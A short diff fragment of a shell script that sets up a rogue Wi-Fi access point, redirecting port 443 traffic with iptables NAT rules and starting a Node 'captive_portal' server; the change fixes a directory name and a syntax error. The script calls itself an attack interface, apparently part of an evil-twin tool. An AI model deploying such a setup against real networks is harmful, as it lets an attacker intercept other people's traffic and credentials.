@@ -106,6 +106,6 @@ iptables -t nat -A PREROUTING -i $FAKE_AP_INTERFACE -p tcp --dport 443 -j DNAT -
 iptables -t nat -A POSTROUTING -o $NET_INTERFACE -j MASQUERADE
 
 log "starting node server"
-cd active_portal; nohup npm run dev &; cd ../
+cd captive_portal; nohup npm run dev &
 
 log "REROUTING MAGIC IS DONE. THE ATTACK INTERFACE IS NOW A WIFI ACCESS POINT WITH THE SSID: $SSID"
